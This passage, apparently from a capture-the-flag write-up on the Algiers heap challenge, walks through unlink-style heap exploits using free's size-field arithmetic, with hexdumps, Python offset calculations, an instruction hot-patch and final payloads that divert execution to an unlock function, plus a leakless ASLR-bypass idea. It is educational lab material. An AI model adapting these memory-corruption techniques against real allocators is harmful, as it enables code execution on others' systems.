<h5>Username</h5>
<pre><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa8888cccceeee</pre></code>

<h5>Password</h5>
<pre><code>bbbb</code></pre>

<p>The contents of memory near addresses <code>0x8888</code> and <code>0xCCCC</code> are as follows.</p>

<pre><code>8880: 0000 0000 0000 0000 0000 0000 <mark>faee</mark> 0000   ................
8890: 0000 0000 0000 0000 0000 0000 0000 0000   ................
88a0: *  
ccc0: 0000 0000 0000 0000 0000 0000 <mark>8888</mark> 0000   ................
ccd0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>

<p>Note the value written to address <code>0x888C</code>. This word is <code>0xEEEE</code> plus <code>0xC</code> (decimal 12) plus the original value at address <code>0x888C</code> (which is zero in this case).</p>

<br>
<div id="slides">
  <section id="technique-4-before-free">
<pre><code class='language-ascii-noshadows'> ┌────────┬────────┬────────┬──────────────────────────┐
 │  8888  │  cccc  │  eeee  │ .... .... .... .... .... │
 └────────┴────────┴──┬──┬──┴──────────────────────────┘
                      │  │
                      ▼  ▼
                     ┌────┐ ┌────┐ ┌────┐
                     │eeee│+│0000│+│000c│
                     └────┘ └────┘ └────┘
                             ▲  ▲
                             │  │
┌───────┬────────┬────────┬──┴──┴──┐
│DATA   │  0000  │  0000  │  0000  │
├───────┼────────┼────────┼────────┤
│ADDRESS│ 0x8888 │ 0x888a │ 0x888c │
└───────┴────────┴────────┴────────┘
</code></pre>
  </section>
  <section id="technique-4-after-free">
<pre><code class='language-ascii-noshadows'> ┌────────┬────────┬────────┬──────────────────────────┐
 │  8888  │  cccc  │  eeee  │ .... .... .... .... .... │
 └────────┴────────┴────────┴──────────────────────────┘


                            ┌────┐
                            │eefa│
                            └┬──┬┘
                             │  │
                             ▼  ▼
┌───────┬────────┬────────┬────────┐
│DATA   │  0000  │  0000  │  <mark>eefa</mark>  │
├───────┼────────┼────────┼────────┤
│ADDRESS│ 0x8888 │ 0x888a │ 0x888c │
└───────┴────────┴────────┴────────┘
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#technique-4-before-free">Before Size Write</a></li>
  <li><a href="#technique-4-after-free">After Size Write</a></li>
</ul>

<p>The value <code>0xC</code> (12) derives from two <code>ADD</code> instructions that each increment the size field by six. The constant <code>0x6</code> may be added to the size field once (for a total of six) or twice (for a total of <code>0xC</code> or decimal 12), depending on which conditional branches the algorithm takes.</p>


<br>
      <figure>
        <img src="./images/algiers/algiers-size-plus-metadata.png"
          loading="eager" alt="Locations where 0x6 is added to size field." />
      </figure>

      <p>To reiterate, this depends on whether the algorithm interprets the previous and next chunks (pointed to by <code>fd</code> and <code>bk</code>) as being in use. The algorithm adds <code>0x6</code> to the size field twice in the above case because both <code>fd</code> and <code>bk</code> point to null memory—causing the interpretation of both "chunks" as being free.</p>

<h5>Constraints</h5>
<ol>
	<li>First, ensure the fake chunk pointed to by <code>bk</code> is free.</li>
	<ul>
	        <li><code>*(bk + 4) % 2 == 0</code>.</li>
	</ul>

	<li>Second, tweak the exploit depending on whether the chunk pointed to by <code>fd</code> is free, as the outcome of this check will slightly modify the size. The pseudocode to do this is as follows.</li>

	<ul>
		<li><code>if ( *(fd + 4) % 2 == 0 ) { size = size + 0x6 }</code>.</li>
	</ul>
</ol>

<h5>Exploit</h5>
<p>Suppose the goal is to overwrite a return address.</p>

<h5>Stack Memory</h5>
<pre><code>4380: 0000 0000 ca46 0100 ca46 0300 3e47 0000   .....F...F..&gt;G..
4390: 0a00 2424 <mark>a846</mark> 0000 0000 4044 0000 0000   ..$$.F....@D....
43a0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>

<p>The hexdump above highlights the return address for <code>free</code>. The backward merge will happen as long as its value is even. To ensure the exploit works, align this word with the <code>size</code> field of the "chunk" to which <code>bk</code> points.</p>

<p>Chunk metadata is six bytes long, so the <code>bk</code> pointer should point to two words lower in memory than the return address.</p>

<h5>Username</h5>
<pre><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<mark>9043</mark>cccceeee</pre></code>

<p>The snippet below underlines this word.</p>

<h5>Stack Memory</h5>
<pre><code>4380: 0000 0000 ca46 0100 ca46 0300 3e47 0000   .....F...F..&gt;G..
4390: <u>0a00</u> 2424 <mark>a846</mark> 0000 0000 4044 0000 0000   ..$$.F....@D....
43a0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>

<p>The fd pointer is still <code>0xCCCC</code>, so the exploit overwrites the word at that address with the value <code>0x4390</code>. This behavior does not affect the exploit, so <code>fd</code> is left as is.</p>


<h5>Username</h5>
<pre><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa9043<mark>cccc</mark>eeee</pre></code>

<h5>Integer Overflow</h5>
<p>The address of the <code>unlock_door</code> function is <code>0x4564</code>, while the target return address value is <code>0x46a8</code>. Because the desired location to return is lower than the existing return address, an integer overflow is required to wrap around. The value <code>0x6</code> is added to the size field twice because the region pointed to by <code>fd</code> is all nulls, which the algorithm interprets as a free chunk. Calculate the correct size value at a Python REPL as follows.</p>


	  <pre><code>&gt;&gt;&gt; shellcode_address &#x3D; 0x4564
&gt;&gt;&gt; return_address &#x3D; 0x46a8
&gt;&gt;&gt; hex((shellcode_address-return_address-12) &amp; 0xffff)
&#39;0xfeb0&#39;</code></pre>

<h4>Final Exploit</h4>

<h5>Username</h5>
<pre><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa9043cccc<mark>b0fe</mark></pre></code>

<h5>Password</h5>
<pre><code>bbbb</code></pre>

<h5>Result</h5>
<pre><code>If you were not connected to the debug lock, the door would now be open.
Try running "solve" in the debug console to see if this solution works without the debugger attached.

The CPU completed in 7284 cycles.
</code></pre>

<h5>Leakless ASLR Bypass</h5>

<p>Using the earlier techniques, the attacker would have to find a way to leak the base address of the stack, heap, or executable segment—which requires finding a second vulnerability. The advantage of this one is that it allows for bypassing ASLR without an information leak.</p>


<p>Suppose a function pointer at a known address references code at a randomized address.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-1" class="sidenote-toggle" />
<span class="sidenote">
	E.g., the Global Offset Table in an ELF binary.
</span>

If the attacker knows that some payload code resides at a constant offset from the randomized address, they can abuse free's size field arithmetic to add that offset to the function pointer—without leaking it first. When the implementation calls that pointer later, it will execute arbitrary code.</p>

<h3>Technique #5: Live Patching Free During The Middle Of The Call</h3>

<p>Consider the test payload from technique #3.</p> 

<h5>Username</h5>
<pre><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa8888cccceeee</pre></code>

<h5>Password</h5>
<pre><code>bbbb</code></pre>

<p>Watch what happens to memory during the course of the first <code>free</code> call.</p>

<br>
<div id="slides">
  <section id="technique-5-memory-1">
	  <pre><code>8880: 0000 0000 0000 0000 0000 0000 0000 0000   ................
8890: 0000 0000 0000 0000 0000 0000 0000 0000   ................</code></pre>
  </section>
  <section id="technique-5-memory-2">
	  <pre><code>8880: 0000 0000 0000 0000 0000 0000 <mark>f4ee</mark> 0000   ................
8890: 0000 0000 0000 0000 0000 0000 0000 0000   ................</code></pre>
  </section>
  <section id="technique-5-memory-3">
	  <pre><code>8880: 0000 0000 0000 0000 0000 <mark>cccc</mark> f4ee 0000   ................
8890: 0000 0000 0000 0000 0000 0000 0000 0000   ................</code></pre>
  </section>
  <section id="technique-5-memory-4">
	  <pre><code>8880: 0000 0000 0000 0000 0000 cccc <mark>faee</mark> 0000   ................
8890: 0000 0000 0000 0000 0000 0000 0000 0000   ................</code></pre>
  </section>
  <section id="technique-5-memory-5">
	  <pre><code>8880: 0000 0000 0000 0000 0000 <mark>0000</mark> faee 0000   ................
8890: 0000 0000 0000 0000 0000 0000 0000 0000   ................</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#technique-5-memory-1">01</a></li>
  <li><a href="#technique-5-memory-2">02</a></li>
  <li><a href="#technique-5-memory-3">03</a></li>
  <li><a href="#technique-5-memory-4">04</a></li>
  <li><a href="#technique-5-memory-5">05</a></li>
</ul>

<p>Notice how <code>0xCCCC</code> briefly appears at address <code>0x888A</code> and is then overwritten with a null word. Imagine if that never happened: the <code>fd</code> pointer would be written just before the <code>size</code> field, combining the previous two techniques and enabling a two-word instruction hot patch into memory.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-1" class="sidenote-toggle" />
<span class="sidenote">
	As long as the first word to be patched in and the second word that will be overwritten in instruction memory are both even.
</span>

This operation must occur in the middle of <code>free</code> during its execution, or the algorithm will corrupt the first word when it updates the forward pointer. This patch must happen before this instruction.</p>



<br>
      <figure>
        <img src="./images/algiers/algiers-free-hotpatch-window-end.png"
          loading="eager" alt="Instruction that corrupts the forward pointer." />
      </figure>
<br>

<p>The target to patch should be just after the algorithm writes the corrupted <code>fd</code> pointer into the middle of <code>free</code>. The following instruction suffices because it is two words long, and its second word, which will be interpreted as the size field, is even.</p>

<pre><code>4534:  1d4f <mark>0200</mark>      mov 0x2(r15), r13</code></pre>

<br>
      <figure>
        <img src="./images/algiers/algiers-free-hotpatch.png"
          loading="eager" alt="Instruction to hotpatch in the free function." />
      </figure>
<br>

<p>Aim the bk pointer two words before that.</p>

<h5>Username</h5>
<pre><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<mark>3245</mark>cccceeee</pre></code>

<p>The <code>CALL</code> instruction will be the first word written. The assembly for it is as follows.</p>

<br>

<table>
	<caption>Example format for <code>CALL</code> Instruction.</caption>
        <thead>
          <tr>
            <th>Example Opcode</th>
            <th>Disassembly</th>
          </tr>
        </thead>
        <tbody>
          <tr>
		  <td><code><mark>b012</mark> feca</code></td>
                  <td><code>call #0xcafe &lt;function_name&gt;</code></td>
          </tr>
        </tbody>
	</table>

<h5>Username</h5>
<pre><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa3245<mark>b012</mark>eeee</pre></code>

<p>The second word should be the address to call, set using technique #4.</p>

<pre><code>&gt;&gt;&gt; address_to_call = 0x4564
&gt;&gt;&gt; instruction_assembly = 0x0002
&gt;&gt;&gt; hex((address_to_call-instruction_assembly-6) &amp; 0xffff)
&apos;<mark>0x455c</mark>&apos;</code></pre>

<p>It is the address of the <code>unlock_door</code> function, but it could also point at some shellcode. Note that the algorithm only adds <code>0x6</code> to the size in this case.</p>

<h4>Final Exploit</h4>
<h5>Username</h5>
<pre><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa3245b012<mark>5c45</mark></code></pre>

<h5>Password</h5>
<pre><code>bbbb</code></pre>

<h5>Result</h5>
<pre><code>If you were not connected to the debug lock, the door would now be open.
Try running "solve" in the debug console to see if this solution works without the debugger attached.

The CPU completed in 7251 cycles.</code></pre>

<h2>The Road to Chernobyl</h2>

<p>These additional variations may be academically interesting, but in this case, they are not any more practically effective than the original unlink exploit.</p>

<p>Algiers, however, is not the only heap exploitation challenge in the series. The penultimate, Chernobyl, involves a heap resident hash table and an implementation that deliberately breaks the conventional dlmalloc technique. In the last decade, only 800 people exploited it. They are the top 2%.</p>


<p>A leaderboard hosted by a security firm with a <a href="https://www.google.com/finance/quote/NCC:LON?window=MAX">nine-figure market cap</a> tracked both exploit cycle counts and lengths for Chernobyl during that period. The two people with the world's shortest exploits for the latter tied for 59 bytes. Understanding the leakless size field arithmetic technique is why <a href="./chernobyl.html">yours truly was one of them</a>.</p>

<h2>Conclusion</h2>

<p>This heap implementation has a very small codebase, which lends itself well to dissection for educational purposes. Attempting to explain the original Doug Lea Malloc exploit in similar detail would be practically impossible due to the sheer size of the code base. It took fifteen years for a simple enough heap implementation to come into existence to enable this walkthrough.</p>

<p>More than being difficult, abusing memory safety vulnerabilities is convoluted. It requires the ability to dive into the lowest levels of the implementation and see what is happening under the abstractions. This explanation attempts to capture as many of the specifics as possible, but even for that, it is far inferior to single-stepping through the assembly. Perhaps this is what deters people—much as some might wish otherwise, there is no such thing as a survey course in pwn.</p>

<p>That said, if it must take a thousand hours, it helps to know where to start. With any luck, this page is that place.</p>

</body></html>
